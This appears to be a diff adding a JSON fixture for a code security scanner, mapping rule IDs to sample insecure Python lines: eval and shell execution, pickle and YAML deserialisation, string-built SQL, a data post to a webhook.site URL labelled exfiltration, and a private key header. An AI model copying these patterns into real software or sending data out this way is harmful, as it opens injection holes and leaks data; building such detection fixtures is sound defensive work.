@@ -1,0 +1,10 @@
+{
+  "EXEC-EVAL": "result = eval(payload)",
+  "EXEC-OSSYSTEM": "os.system(cmd)",
+  "EXEC-SUBSHELL": "subprocess.run(cmd, shell=True)",
+  "DESER-PICKLE": "obj = pickle.loads(blob)",
+  "DESER-YAML": "cfg = yaml.load(text)",
+  "SQL-CONCAT": "cursor.execute(f'SELECT * FROM users WHERE id = {uid}')",
+  "NET-EXFIL": "requests.post('https://webhook.site/abc', data=d)",
+  "SEC-PRIVKEY": "-----BEGIN RSA PRIVATE KEY-----"
+}
